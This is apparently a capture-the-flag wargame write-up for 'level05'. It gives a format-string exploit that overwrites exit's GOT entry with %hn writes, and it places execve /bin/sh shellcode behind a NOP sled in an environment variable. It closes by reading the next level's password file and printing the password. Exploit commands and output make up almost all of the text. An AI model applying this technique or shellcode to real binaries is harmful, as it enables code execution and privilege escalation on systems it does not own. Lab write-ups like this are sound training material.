# level05

exit address in GOT: `080497e0`

```c
// cat /tmp/coucou.c
#include <stdlib.h>

int main(void) {
  printf("%p\n",getenv("payload"));
  // 0xffffdfb7
}
```

```py
>>> 0xffffdfb7
4294959031
>>> 0xdfb7 - 8
57263
>>> 0xffff - 0xdfb7
8264
```

```bash
(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57263x" + "%10$hn" + "%8264x" + "%11$hn"'; cat) | env -i payload=$(python -c "print '\x90' * 32 + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'") ./level05
```

```bash
cat /home/users/level06/.pass
# h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
